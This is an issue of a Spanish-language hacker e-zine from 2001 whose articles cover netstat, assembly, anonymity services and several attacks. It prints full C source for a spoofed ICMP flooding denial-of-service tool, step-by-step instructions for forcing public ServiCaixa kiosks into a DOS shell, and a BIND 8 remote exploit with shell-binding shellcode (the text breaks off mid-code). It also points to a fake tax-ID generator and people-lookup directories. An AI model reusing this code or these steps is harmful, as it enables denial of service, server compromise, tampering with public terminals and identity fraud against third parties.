--------------------------------------------------------------------
 	             __     __      ______   __      
	            /\ \   /\ \    / ____/  /\ \
	            \ \ \  \ \ \  /\ \      \ \ \
	             \ \ \  \ \ \ \ \ \	 \ \ \
	              \ \ \__\_\ \ \ \ \_____ \ \ \	
	               \ \_______/  \ \______\ \ \_\
       	          \/______/    \/______/  \/_/


                  Unión de Conocimientos Informáticos
--------------------------------------------------------------------
                    - UCI Nº 2 - Febrero del 2001 -
--------------------------------------------------------------------


			-.-._CONTENIDOS EN UCI Nº 2_.-.-


[1].Acerca de UCI


							-Sobre2is-


[2].Novedades


							-Equipo UCI-


[3].Netstat en win

	
							-s0b-


[4].DoS ICMP-Error


							-Lord Soth-


[5].La gilipollez del mes


							-[MaDMaX]-

		
[6].Aprendiendo ensamblador (2ª entrega)				


							-Byteman-


[7].Fallo de seguridad en cajeros Servicaixa


							-Lord Soth-


[8]. Vulnerabilidad en BIND 4 y 8


							-Lord Soth-


[9].Una de troyanos (1ª entrega)


							-Halls-


[10].La Web del Mes


							-k@in-
	

[11].Preservando el sistema (Set uid shell)


							-BodyBoy-


[12].IRC BOTS Introduccion y configuracion de un darkbot


							-MaLiGnO-


[13].Cartas a UCI


							-S0b-



[14].Colabora con nosotros. Despedida


							-S0b-



--------------------------------------------------------------------
--------------------------------------------------------------------





[1].Acerca de UCI
   -Sobre2is-


	UCI (Unión de Conocimientos Informáticos) busca ser una publicación electrónica que trate diversos temas girando en torno al mundo under. Sin embargo, tampoco tenemos una linea de trabajo estricta, por lo que casi todo lo que consideremos interesante tiene cabida aqui :)

	Todo el contenido de esta publicación se ha hecho con fines meramente educativos. UCI no se responsabiliza del uso que el lector pueda darle a la información aqui contenida.
 
	Si lo que aqui leas lo consideras todo más que sabido pues simplemente ignóralo o aportanos algo mejor :p, si leyendo UCI aprendes algo que antes no sabías, pues muchas gracias, porque ese es nuestro objetivo, enseñar a gente como tú :)


	Para cualquier queja/duda/sugerencia puedes encontrarnos en:


			http://uciweb.cjb.net 
			
			http://www.islatortuga.com/users/uci
					
			uci@paistortuga.com

			IRC hispano, canal #UCI


			


--------------------------------------------------------------------
--------------------------------------------------------------------





[2].Novedades
   -Equipo UCI-


	Hola a todos! ¡¡Ya hemos llegado al nº2!! Qué rápido pasan los meses ¿verdad? :)
	
	En este nº2 hemos crecido en miembros, en contenido y creemos que en calidad por lo cual nos podemos dar por satisfechos.

	Como malas noticias:

	Sweetjane y su apartado "Inkisiciones" abandonan UCI 
(¿momentaneamente?¿para siempre? quien sabe :) ) El motivo ha sido que su autora no consideraba que la temática de su sección tuviese que ver con los demás contenidos de UCI. Asi que nada, querido lector, si quieres volver a ver esa sección maileanos pidiendola a gritos para ver si asi el público la convence de volver ;)


	Como buenas noticias:

	Lord Soth se incorpora al equipo de UCI desempeñando un papel 
de co-editor (además de articulista y currante en general ;) ) Esperemos asi s0b tenga algo más de tiempo libre.

	Nuevas colaboraciones: los colaboradores del nº anterior han seguido con nosotros o bien se han comprometido a aportar algo en UCI3 con lo cual se mantiene la gente de UCI1. Pero además nueva gente con nuevos artículos y nuevas ideas nos ha mandado sus artículos y ofrecido su ayuda. Gracias a k@in, Halls y BodyBoy por sus aportaciones.

	Como ya dijimos antes, UCI ha crecido en contenido, asi que ya no hemos tenido que poner relleno al final de la ezine para que a los usuarios de win os cargue directamente en wordpad (todo un logro! xDDD)

	Tenemos nueva Web. Después del diseño, digamos, ejem, un tanto cutre de la primera web que sacamos :Þ ahora hemos desarrollado otra en flash k es bastante más vistosa. Si aun no está cuando leáis este número, paciencia pq en cuanto tenga un par de arreglillos que le faltan estará arriba.


	También tenemos nueva url de la página web. Hemos creado una sencilla redirección que servirá para que te acuerdes mejor de donde estamos:

	Redireccion:   http://uciweb.cjb.net

	Dirección original:   http://www.islatortuga.com/users/uci


	Y no podía faltar, nuestro canal en el irc-hispano. Estás invitado a pasarte cuando quieras por #UCI  ;)


	Bueno, supongo se nos olvidan mil cosas que deberíamos haber citado como novedades, pero UCI2 tiene prisa por salir, asi que, hasta la próxima!!!!





--------------------------------------------------------------------
--------------------------------------------------------------------





[3].Netstat en windows
   -S0b-


El programa netstat es un programa ke viene de serie en ¿todos? los windows y ke nos permitirá ver nuestra tabla de conexiones (conexiones abiertas, protocolos, puertos, etc)

¿Que para qué sirve esto? pues para todos aquellos ke alguna vez preguntasteis ¿cómo puedo sacar la ip de un colega? ¿y la mia? o... ¿estoy contaminado por algun troyano?  Para todos vosotros netstat es la respuesta.

Para variar, lo poco útil ke tiene windows, está "escondido". Asi ke para poder usar netstat deberéis abrir una ventana de msdos y desde alli, desde la linea de comandos, será desde donde usemos este programa.

En teoría c:\windows (ke es donde esta situado netstat.exe) debería ser accesible desde cualkier directorio de vuestro hd (c:\windows suele estar en el path del autoexec) pero por si acaso, os situaréis en el directorio de windows (si es ke no estais ya) (escribiendo en la ventana de msdos 'cd c:\windows' pa los torpes ;) )

Weno, ya estamos colocados y preparados para usar netstat.


Lo primero que haremos será mirar la ayuda, para eso escribiremos:

---------------------
C:\WINDOWS>netstat /?
---------------------


Y obtendremos en pantalla lo siguiente:


--------------------------------------------------------------------
Muestra estadísticas del protocolo y conexiones TCP/IP actuales.

NETSTAT [-a] [-e] [-n] [-s] [-p proto] [-r] [1intervalo]

  -a            Muestra todas las conexiones y puertos escucha.
  -e            Muestra estadísticas Ethernet. Se puede combinar con 		    -s.
  -n            Muestra números de puertos y direcciones en formato 		    numérico.
  -p proto      Muestra conexiones del protocolo especificado por 		    proto; que puede ser tcp o udp. Si se usa con la 			    opción -s para mostrar estadísticas por protocolo, 		    proto puede ser TCP, UDP o IP.
  -r            Muestra el contenido de la tabla de rutas.
  -s            Muestra estadísticas por protocolo. En forma 			    predeterminada, se muestran para TCP, UDP e IP; se 		    puede utilizar la opción -p para especificar un 			    subconjunto de lo predeterminado.
  intervalo     Vuelve a mostrar las estadísticas seleccionadas, 			    haciendo pausas en el intervalo de segundos 			    especificado entre cada muestra. Presione Ctrl+C 			    para detener la actualización de estadísticas. Si se 		    omite, netstat imprimirá la actual información de 		    configuración una vez.
--------------------------------------------------------------------

	Bien, ahi tenemos todos los parametros que netstat nos ofrece.

	Nosotros nos centraremos principalmente en dos de los parámetros mas útiles, el parámetro "-a" y el parámetro "-n". Ambos hacen básicamente lo mismo, sin embargo "-n" nos mostrará las direcciones en formato numérico (cosa ke "-a" no hace)

	El parametro "-a" nos mostrará las conexiones activas en nuestra maquina (mostrando para cada conexión nuestra direccion local(y puerto usado), el ekipo al k estamos conectados(y puerto usado), el protocolo utilizado y el estado de la conexión)

	Asi que escribimos: netstat -a
Y obtenemos por ejemplo esto:

--------------------------------------------------------------------
Conexiones activas

  Proto  Dirección local    Dirección remota         Estado
  TCP    s0b:1052           irc1.landsraad.net:6668  ESTABLISHED
  TCP    s0b:1054           pop.gmx.net:pop3       FIN_WAIT_1
  TCP    s0b:1055           pop.gmx.net:pop3       SYN_SENT

--------------------------------------------------------------------


Asi cada fila correspondería a una conexión activa. 

Proto sería la columna k indica los posibles protocolos de las conexiones (TCP, UDP o IP)

Dirección local sería el nombre de nuestra maquina y después de los ":" estaría el puerto ke nuestra makina tiene abierto para esa conexión

Dirección remota sería el host de la makina a la que estamos conectados y como antes, tras los ":" el puerto utilizado para la conexión por esa makina.

Estado nos indicaría si la conexión esta establecida, produciendose, esperando, etc


	Weno, pues ¿para k sirve esta comando? pues con esto ya podréis presumir delante de esa tia k tanto os mola y detectar si tiene un troyano o no :p Para ello solo tendríais k mirar una lista de puertos de troyanos (la podeís encontrar en la sección UCI Labs de nuestra página). Si veis k permanentemente hay una conexión en el sistema escuchando por uno de esos puertos, pues estais contaminados ;)

	Como ya dijimos antes el parámetro -n es como el -a pero muestra las direcciones en formato numérico.
	
	Asi que escribimos: netstat -n y obtenemos por ejemplo:

--------------------------------------------------------------------
Conexiones activas

  Proto  Dirección local        Dirección remota       Estado
  TCP    213.98.184.4:1052      212.59.199.130:6668    ESTABLISHED
  TCP    213.98.184.4:1076      194.221.183.20:110     TIME_WAIT
  TCP    213.98.184.4:1077      194.221.183.20:110     TIME_WAIT
  TCP    213.98.184.4:1079      156.35.94.1:110        SYN_SENT
--------------------------------------------------------------------

Las columnas serían lo mismo ke antes, sólo ke ahora ya en formáto numérico. Por eso de aqui podríamos ya sacar nuestra ip (dirección local) la ip de la persona con la que estamos chateando directamente (direcciones remotas) y mil cosas más...

Si os fijáis y practicáis varios ejemplos veréis k con la opción -n solo os salen las conexiones de protocolo TCP. Para solucionar esto solo debéis utilizar "netstat -na" y ya os saldran las conexiones de todos los tipos en formato numérico.

Weno, este artículo es algo chorras (pq con la ayuda del netstat casi os podéis enterar de todo lo k yo os cuento aki) y faltarían más cosas por explicar del netstat pero de momento sirve para q os hagais una idea :) 

¡¡Nos vemos!!





--------------------------------------------------------------------
--------------------------------------------------------------------





[4].DoS ICMP-Error
   -Lord Soth-


	En esta seccion intentare dar informacion sobre los DoS (Denial of Service) o NuKeS, para que asi aprendais vulnerabilidades en las transmisiones de datos y de paso no los useis sin saber ni siquiera que hacen...;o). Mas en concreto, el primer DoS es el ICMP-Error.

	Para los que no sepan desglosar estos dos terminos, ICMP (Internet Control Managment Protocol) es el protocolo usado para el control en las transmisiones de datos por internet, y el ICMP-Error es la forma mas comun de llamar a los ICMP que contienen un mensaje de error aunque, por ejemplo, el ipchains de Linux los engloba en el tipo de ICMP "Host Unreachable" (Host no accesible).

	Una vez explicado esto, pasemos a la teoria. Si nosotros tenemos una conexion TCP (es decir, si establecemos conexion con cualquier servidor o alguien se conecta a nosotros) empiezan a enviarse paquetes ICMP, ya que se suelen utilizar con el protocolo TCP (no, no se usan en UDP ya que el TCP es un protocolo orientado a conexion y el UDP no). Ahora bien, sabiendo que en una conexion TCP se envian paquetes ICMP (algo tremendamente normal), podriamos "fingir" que somos uno de los dos puntos de dicha conexion y enviar al otro punto un paquete ICMP-ERROR para que se desconecte. Esto suena algo brusco, asi que lo explicare con un ejemplo:

	Si A es mi pc, y me conecto al IRC (irc.iddeo.es puerto 6667), una persona podria enviar paquetes ICMP diciendo que es el host origen "irc.iddeo.es", que el puerto de origen del paquete ICMP es el 6667, que el host de destino soy yo e ir probando puertos del 0 al 65535 (puerto maximo en un ordenador) con el mensaje "soy irc.iddeo.es desde el puerto 6667, me acabo de caer, asi que deja de enviar informacion", de tal forma que desconectariamos del IRC.

	Esta tecnica se puede hacer de dos formas: atacando por ejemplo a mi (A) diciendo que el paquete es del servidor IRC, o atacando al servidor Irc (B) diciendo que soy yo, aunque esto ultimo no suele funcionar, ya que los servidores suelen estar protegidos.

	Protegiendote: para protegerte necesitaras un cortafuegos, y cortar el paso a los paquetes ICMP-Error, de tal forma que si nos llega uno verdadero nos jodemos y al ver que no seguimos transmitiendo sabremos lo que paso :). Un pequeño inconveniento a cambio de una proteccion. 

	Las reglas de ipchains serian:

ipchains -A input -p icmp --icmp-type host-unreachable -s 0/0 -d 0/0 -j DENY

o bien si queremos solo denegar los icmp-error de irc.iddeo.es (por ejemplo)

ipchains -A input -p icmp --icmp-type host-unreachable -s <ip del servidor>/0 -d 0/0 --source-port 6667 -j DENY

	La tecnica por la cual fingimos ser una IP que no somos se denomina IP Spoofing, y fingir ser un host que no somos es DNS Spoofing, o VHosting, o Bouncing...hay mil tecnicas, que se iran explicando en el e-zine :-).

Programas
---------

ICMP-ERROR para windows: cojed el w-newk o el click del script de mIRC "7th sphere"
ICMP-ERROR para linux:
--------------------------INICIO DEL FICHERO ice.c
/* ice.c                         */
/* Programador: Stealth_C^       */
/* Traductor: Lord Soth (UCI)    */
/* Tipo: DoS <ICMP-ERROR>        */
/* Compilacion: gcc -o ice ice.c */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <pwd.h>
#include <time.h>
#include <sys/utsname.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/igmp.h>

void banner(void) {
        
	printf("ice, floodea al objetivo con icmps aleatorios\n");
	printf("por Stealth_C^ / Lord Soth (UCI)\n\n");
}
void usage(const char *progname) {
	printf("sintaxis : ./ice (objetivo) (nº de paquetes)\n");
}
int resolve( const char *name, unsigned int port, struct sockaddr_in *addr ) {
	struct hostent *host;
	memset(addr,0,sizeof(struct sockaddr_in));
	addr->sin_family = AF_INET;
	addr->sin_addr.s_addr = inet_addr(name);
	if (addr->sin_addr.s_addr == -1) {
	if (( host = gethostbyname(name) ) == NULL )  {
	fprintf(stderr,"Host desconocido...\n",name);
	return(-1);
	}
	addr->sin_family = host->h_addrtype;
	memcpy((caddr_t)&addr->sin_addr,host->h_addr,host->h_length);
	}
	addr->sin_port = htons(port);
	return(0);
}
unsigned short in_cksum(addr, len)
	u_short *addr;
	int len;
{
	register int nleft = len;
	register u_short *w = addr;
	register int sum = 0;
	u_short answer = 0;
	while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
}
	if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);                 
	answer = ~sum;                      
	return(answer);
}
int icmp1(int socket, unsigned long spoof_addr, struct sockaddr_in *dest_addr) {
	unsigned char  *packet;
	struct iphdr   *ip;
	struct icmphdr *icmp;
	int rc;
	packet = (unsigned char *)malloc(sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);
	ip = (struct iphdr *)packet;
	icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
	memset(ip,0,sizeof(struct iphdr) + sizeof(struct icmphdr) + 8);

	ip->ihl = 5;
	ip->version = 4;
	ip->tos = 4;
	ip->id = htons(1234);
	ip->frag_off = htons(0x2000);
	ip->tot_len = 0;
	ip->ttl = 255;
	ip->protocol = IPPROTO_ICMP;
	ip->saddr = rand() % 549874540;
	ip->daddr = dest_addr->sin_addr.s_addr;
	ip->check = in_cksum(ip, sizeof(struct iphdr));

	icmp->type = rand() % 18;
	icmp->code = rand() % 15;
	icmp->checksum = in_cksum(icmp,sizeof(struct icmphdr) + 1);
	if (sendto(socket, packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + 1,0, (struct sockaddr *)dest_addr, sizeof(struct sockaddr)) == -1) { return(-1); }
	free(packet);
	return(0);
}
int main(int argc, char **argv) {
	struct sockaddr_in dest_addr;
	unsigned int i,sock;
	unsigned long src_addr;
	banner();
	if ((argc != 3)) {
	usage(argv[0]);
	return(-1);
}
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
	fprintf(stderr,"necesitas arrancar el programa desde la cuenta root..\n");
	return(-1);
}

	/*  if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); } */
	src_addr = dest_addr.sin_addr.s_addr;
	if (resolve(argv[1],0,&dest_addr) == -1) { return(-1); }
	printf("Atacando.\n",argv[0]);
	for (i = 0;i < atoi(argv[2]);i++) {
	if (icmp1(sock,rand() % 5000000,&dest_addr) == -1) {
	fprintf(stderr,"mrrh\n");
	return(-1);
      }
   }
}
--------------------------FIN DEL FICHERO ice.c





--------------------------------------------------------------------
--------------------------------------------------------------------






[5].La gilipollez del mes
   -[MaDMaX]-


	Bueno, este mes os traigo dos gilipolleces ;) La primera es una chorrada de bug del año la pera pero que como el otro día lo use me hizo ilusión y lo pongo xD. La segunda es una selección de links que puede os sean útiles en alguna que otra ocasión.

	
Gilipollez 1
------------

	Pues bien, el otro día, por cosas de la vida, fui a una casa de esas que tienen un niño pequeño repelente que sus papis lo tienen como si fuese un gurú. En este tipo de casas te obligan a ver cada vez que vas los dibujos en el paint que ha hecho su gatescillo, las caratulas de arranque de windows que ha cambiado y demás... pffff... xD
	La última que me encontré al llegar fue que el niño de marrás había puesto un password al salvapantallas de su windows95 (parece mentira k aun haya wins95 por ahi, ¿no? ) y no quería decirle el password a sus papis (te juro lo mataba!! xD). Pues bien, la gilipollez está en que win95 te permite pulsar ctrl+alt+supr y finalizar las tareas activas a pesar de ke tengas la pantalla del password del salvapantallas. Asi pulsas eso, le das a finalizar tarea (la tarea del salvapantallas) y puedes frustrar a un futuro Gates y quien sabe... igual sólo por eso evitas que de mayor sea un kpullo ;)



Gilipollez 2
------------

Poz weno, aqui lo único ke os pondré son unas cuantas direcciones interesantes para navegar anonimamente, enviar mails anonimos, generar NIFS falsos, etc

*********

http://www.jauja.es.org

Esta dirección (un portal multiusos de estos) tiene dos opciones interesantes (dos botones en su parte derecha):
-Una de las opciones permite generar letras dado un DNI (por lo que sirve para generar NIFS falsos)
-Otra de las opciones nos da la compañia telefónica correspondiente a un prefijo determinado (utilisimo también)

*********

http://www.anonymizer.com/

En esta url tenéis un servicio de demostración en el cual si escribís en la cajita la dirección ke keréis visitar lo haréis de forma anónima (sin mostrar vuestra ip a la página). 

Eso si, el servicio es una demo, por lo que tiene vetadas ciertas direcciones, la velocidad, etc. 

Si keréis utilizar anonymizer más rapido, usad esto directamente en el navegador:
-----
http://util.anonymizer.com/cgi-bin/freeaction.cgi?go=go&url=http://uciweb.cjb.net
-----
Y sustituis la direccion de despues del = (en este caso la nuestra) por la k kerais visitar.

Para comprobar k esto funciona, podéis visitar nuestra url con anonymizer y luego ver las estadísticas de nuestra página en 

http://es.nedstat.net/cgi-bin/viewstat?name=ucisob

Veréis que en las ultimas visitas, aparece una visita cuya ip es:
Estados Unidos (anonymizer.us)
Esa visita ha sido vuestra visita anónima :)
*********
http://proxy.spaceproxy.com/

Otro servicio del estilo de anonymizer. Este no nos restringe páginas pero nos mete un banner como la copa de un pino.

Como antes, si keréis acceder más rapido, solo sustituid nuestra url por la url ke keráis visitar:

http://proxy.spaceproxy.com/-_-http://uciweb.cjb.net

*********

http://www6.somebody.net/mail/mail.cgi
http://www.cliccato.com/email_esp.htm

Desde esas dos direcciones podréis enviar emails de forma anónima. Personalmente opino k la primera url es bastante menos cutre ke la segunda ;) Y bueno, k sepáis k si os sobran las pelas en www.somebody.net os ofrecen una pila de servicios de anonimato.


*********

http://v3.com 

En esta página tenéis un servicio gratuito de redireccion de url´s y direcciones de e-mail. Es útil por si keréis seguir recibiendo el correo en vuestra cuenta de siempre pero no os gusta dar vuestra dirección original. Lo mismo se aplicaría para la redireccion de webs, eso si, en las redirecciones de webs meten un banner(como no)

*********

http://www.paginasblancas.es

Pues ya la última dirección que comento. Esta es una macro-guia de tlf puesta on-line por timofónica ke nos muestra los teléfonos y datos de las personas de toda España accesibles mediante campos de búsqueda. 

Parece mentira, pero con este servicio, sabiendo un par de datos de una persona y teniendo algo de suerte, puedes encontrarla en la guía y sacar su teléfono y su dirección exactos.

También tenéis el mismo servicio k en páginas blancas en esta otra dirección, solo k esta os ofrece servicio a nivel mundial, páginas amarillas, etc etc http://www.guiatelefonica.com/


Y weno, se acabaron las gilipolleces de este mes. Como siempre digo, para la próxima más y mejor :)





--------------------------------------------------------------------
--------------------------------------------------------------------






[6].Aprendiendo ensamblador (2ª entrega)
   -Byteman-

	Bueno, la verdad es que para este segundo numero del curso básico de ensamblador había pensado en daros algo un poquillo más practico y menos teórico que en el anterior número.

	Antes de nada empezaré por deciros alguna herramientas que os harán falta si os gusta esto del bajo nivel:


	Lo primero que necesitareis es un buen ensamblador; uno bastante conseguidillo es el Turbo Assembler, pero para mi es un poco aparatoso para el nivel al que queremos empezar a programar. También tenemos el Macro Assembler, pero la verdad es que tiene el mismo problema que el anterior; lo que yo os aconsejaría es bajaros el A86, un ensamblador de dominio publico que trabaja en modo DOS (o emulacion de DOS) y que cumple todos los requisitos que necesitaremos de momento. Es pequeño, manejable y permite tener un control bastante amplio sobre la forma de ensamblar los programas.


	En segundo lugar sería bastante util tambien un depurador; como el Turbo Debugger de borland o si quereis algo más "sofisticado" el SoftIce. Los dos se pueden encontrar en Altavista o  en cualquier otro buscador.

	Una herramienta que también es muy útil, por no decir absolutamente necesaria es una lista de interrupciones. La que yo utilizo es la de Ralph Brown, una lista muy detallada con información actualizada sobre cada interrupción, y que podreis encontrar buscando Ralph Brown en cualquier buscador decente.

	A lo mejor es de ayuda hacerse tambien con una lista de los comandos validos en el microprocesador 8086 o si quereis, del pentium. Si no podeis encontrar alguna de estas utilidades en la red poneros en contacto conmigo en la dirección b_y_t_e_m_a_n@hotmail.com pero no creo que tengais problemas para encontrarlas.

	De momento os sugiero que os familiariceis con las herramientas que os he mencionado, pues es completamente necesario comprender y manejar perfectamente cada una de ellas para tener un buen control de la maquina y poder desenvolverse con soltura en el lenguaje de bajo nivel. 

	Suele ser bastante util ensamblar y analizar los ejemplos que vienen con el ensamblador o incluso algunos que podeis bajar de paginas como programmersheaven.com pero lo más importante es que probeis con la lista de interrupciones y trateis de hacer algun programilla de prueba. 

	En el proximo numero espero que ya hayais hecho algunos de los deberes que os pongo en este artículo y podremos meternos ya con mas profundidad en lo que es la programación propiamente dicha. 

	En la siguiente entrega pienso hacer también una aproximación a lo que es el Cracking o el arte de "retocar" los codigos ajenos para que hagan lo que tu quieres que hagan. Esta es quizá la parte más divertida de la informatica, pero antes de nada os diré que es completamente ilegal modificar codigos que no han sido declarados como publicos. 

	Os daré ejemplos para que podais practicar sin necesidad de ir a la carcel, pero hasta entonces tratad de ser buenos y simplemente empezad por programas del tipo "Hola mundo".





--------------------------------------------------------------------
--------------------------------------------------------------------





[7].Fallo de seguridad en cajeros ServiCaixa
   -Lord Soth-


	Debido a la antiguedad de algunos cajeros ServiCaixa (muchos mejor dicho) y junto con la defectuosa programacion del sistema, estos cajeros que nos permiten sacar entradas entre otras cosas (no nos permiten sacar dinero, si pretendes eso, no sigas leyendo) tienen un error en seguridad.

	El error concretamente esta basado en un Overflow, y la teoria es causar un desbordamiento que, en contra a lo que es logico, hace que se reinicie el cajero (BIOS antigua quizas?), pudiendo acceder a la bios y cambiar sus configuraciones para entrar en MS-DOS en vez de entrar en el programa normal del cajero.

La practica:

* Dejemos pulsadas las teclas OK+CANCEL+CORREJIR, si suena <bip> repetidas veces, estamos en el buen camino. Dejemoslas pulsadas hasta que la pantalla se vuelva negra y el cartel de "Funciona" pase a "No funciona". Cuando la pantalla este en negro, significa que esta reseteado.

* Inmediatamente comenzamos a presionar (pasando el dedo por encima) todas las teclas de funcion (F1, F2...F12) para provocar un fallo de teclado a la vez que entramos en la BIOS (descubriendo antes que es un IBM Aptiva 486, aunque informes me indican que en algunos incluso son Macintosh).

* Una vez en la BIOS, vemos algo curioso: no podemos acceder a toda por no tener tecla de Av. Pagina...o si? si nos fijamos, aunque dicha tecla no este dibujada, hay muchas que no lo estan pero podemos pulsar, asi que miraremos cual es el Av. Pagina para llegar al "Boot Secuence" (Secuencia de arranque) y pondremos que primero arranque desde la unidad "D", que esta cargada con MSDOS unicamente y se usa para mantenimiento, ya que tiene soporte de red.

No diremos ninguna forma de usar esto de forma maligna, asi que aqui acaba la explicacion :-)





--------------------------------------------------------------------
--------------------------------------------------------------------





[8]. Vulnerabilidad en BIND 4 y 8
   -Lord Soth-


Sistemas afectados: 

BIND 8: 
• 8.2, 8.2.1 
• 8.2.2 a traves de 8.2.2-P7 
• 8.2.3-T1A a traves de 8.2.3-T9B 

BIND 4: 
• buffer overflow - 4.9.5 a traves de 4.9.7 
• format string - 4.9.3 a traves de 4.9.5-P1


Bind 8
------
Como el overflow se produce en la transaccion de firmas (TSIG) puede ser usado con todo tipo de DNS.

El overflow es posible debido a que en situaciones normales la DNS usa dos funciones dependiendo del tipo de transmision (datagram_read() con el buffer u.buf en UDP y stream_gentlen() con el buffer sp->s_buf) ademas de las dos variables claves para el seguimiento del tamaño del paquete: msglen y buflen.

Durante la transmision, la DNS creera que msglen + buflen = tamaño del buffer. Si introducimos una firma no valida, primero se procesara, dara que la clave no es valida, pero se volvera a cargar en el buffer y pensara que msglen + buflen = tamaño del buffer, que en circunstancias normales seria correcto, pero como se proceso 2 veces, se duplicara en buffer, pero msglen+buflen = la mitad del tamaño real. Para informacion sobre las variables exactas que se usan para el overflow, id a los links de abajo (aqui se explica solo como se hace para que se comprenda, los programadores id al link)

Bind 4
------
En este caso el overflow se produce al mirar la ip.

Si enviamos una peticion de resolucion con un nombre larguisimo, teniendo que redireccionar la peticion a un DNS preparado ;), podemos crear un overflow en la funcion del syslog nslookupComplain(), ya que cuando pasa la peticion a otra DNS, se queda ahi para seguirla de cerca, y asi podremos usarlo siguiendo la misma teoria que el overflow antes explicado


Mas informacion: http://www.pgp.com/research/covert/advisories/047.asp (ingles)
                http://www.isc.org/products/BIND/bind-security.html
Parches: ftp://ftp.isc.org/isc/bind/src/
         http://www.cert.org/advisories/CA-2001-02.html




--Exploit
/* Nombre: bind8
 * Creador: Ian Goldberg y Jonathan Wilkins
 * Traductor: Lord Soth (UCI)
 * Compilacion: gcc -o bind8 bind8.c
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>

#define max(a,b) ((a)>(b)?(a):(b))

#define BUFFSIZE 4096

int argevdisp1, argevdisp2;

char shellcode[] =
"\xeb\x44"                           /* jmp intr      
         */ // 2 - 2
"\x5e"                               /* popl %esi     
         */ // 1 - 3

  /* socket() */
"\x29\xc0"                           /* subl %eax,
%eax         */ // 2 - 5
"\x89\x46\x10"                       /* movl %eax,
0x10(%esi)   */ // 3 - 8
"\x40"                               /* incl %eax     
         */ // 1 - 9
"\x89\xc3"                           /* movl %eax,
%ebx         */ // 2 - 11
"\x89\x46\x0c"                       /* movl %eax,
0x0c(%esi)   */ // 3 - 14
"\x40"                               /* incl %eax     
         */ // 1 - 15
"\x89\x46\x08"                       /* movl %eax,
0x08(%esi)   */ // 3 - 18
"\x8d\x4e\x08"                       /* leal
0x08(%esi), %ecx   */ // 3 - 21
"\xb0\x66"                           /* movb $0x66,
%al         */ // 2 - 23
"\xcd\x80"                           /* int $0x80     
         */ // 2 - 25

"\x43"                               /* incl %ebx     
         */ // 1 - 26
"\xc6\x46\x10\x10"                   /* movb $0x10,
0x10(%esi)  */ // 4 - 30
"\x66\x89\x5e\x14"                   /* movw %bx,
0x14(%esi)    */ // 4 - 34
"\x88\x46\x08"                       /* movb %al,
0x08(%esi)    */ // 3 - 37
"\x29\xc0"                           /* subl %eax,
%eax         */ // 2 - 39
"\x89\xc2"                           /* movl %eax,
%edx         */ // 2 - 41
"\x89\x46\x18"                       /* movl %eax,
0x18(%esi)   */ // 3 - 44
/*
"\xb0\x90"                           /* movb $0x90,
%al         */ // 2 - 46
"\x66\x89\x46\x16"                   /* movw %ax,
0x16(%esi)    */ // 4 - 50
"\x8d\x4e\x14"                       /* leal
0x14(%esi), %ecx   */ // 3 - 53
"\x89\x4e\x0c"                       /* movl %ecx,
0x0c(%esi)   */ // 3 - 56
"\x8d\x4e\x08"                       /* leal
0x08(%esi), %ecx   */ // 3 - 59

"\xeb\x02"                           /* jmp cont      
         */ // 2 - 2
/* intr: */
"\xeb\x43"                           /* jmp callz     
         */ // 2 - 4

/* cont: */
"\xb0\x66"                           /* movb $0x66,
%al         */ // 2 - 6
"\xcd\x80"                           /* int $0x80     
         */ // 2 - 10

"\x89\x5e\x0c"                       /* movl %ebx,
0x0c(%esi)   */ // 3 - 11
"\x43"                               /* incl %ebx     
         */ // 1 - 12
"\x43"                               /* incl %ebx     
         */ // 1 - 13
"\xb0\x66"                           /* movb $0x66,
%al         */ // 2 - 15
"\xcd\x80"                           /* int $0x80     
         */ // 2 - 17

"\x89\x56\x0c"                       /* movl %edx,
0x0c(%esi)   */ // 3 - 20
"\x89\x56\x10"                       /* movl %edx,
0x10(%esi)   */ // 3 - 23
"\xb0\x66"                           /* movb $0x66,
%al         */ // 2 - 25
"\x43"                               /* incl %ebx     
         */ // 1 - 26
"\xcd\x80"                           /* int $0x80     
         */ // 1 - 27

"\x86\xc3"                           /* xchgb %al, %bl
         */ // 2 - 29
"\xb0\x3f"                           /* movb $0x3f,
%al         */ // 2 - 31
"\x29\xc9"                           /* subl %ecx,
%ecx         */ // 2 - 33
"\xcd\x80"                           /* int $0x80     
         */ // 2 - 35
"\xb0\x3f"                           /* movb $0x3f,
%al         */ // 2 - 37
"\x41"                               /* incl %ecx     
         */ // 1 - 38
"\xcd\x80"                           /* int $0x80     
         */ // 2 - 40
"\xb0\x3f"                           /* movb $0x3f,
%al         */ // 2 - 42
"\x41"                               /* incl %ecx     
         */ // 1 - 43
"\xcd\x80"                           /* int $0x80     
         */ // 2 - 45

"\x88\x56\x07"                       /* movb %dl,
0x07(%esi)    */ // 3 - 48
"\x89\x76\x0c"                       /* movl %esi,
0x0c(%esi)   */ // 3 - 51
"\x87\xf3"                           /* xchgl %esi,
%ebx        */ // 2 - 53
"\x8d\x4b\x0c"                       /* leal
0x0c(%ebx), %ecx   */ // 3 - 56
"\xb0\x0b"                           /* movb $0x0b,
%al         */ // 2 - 58
"\xcd\x80"                           /* int $0x80     
         */ // 2 - 60

"\x90"

"\xe8\x72\xff\xff\xff"               /* call start    
         */ // 5 - 5
"/bin/sh"; /* Hay un NULL al final*/                  
  // 8 - 13

unsigned long resolve_host(char* host)
{
long res;
struct hostent* he;

if (0 > (res = inet_addr(host)))
{
if (!(he = gethostbyname(host)))
return(0);
res = *(unsigned long*)he->h_addr;
}
return(res);
}

int dumpbuf(char *buff, int len)
{
char line[17];
int x;

/* Salida en pantalla de HEX */
for(x=0;x<len;x++){
if(!(x%16) && x){
line[16] = 0;
printf("\t%s\n", line);
}
printf("%02X ", (unsigned char)buff[x]);
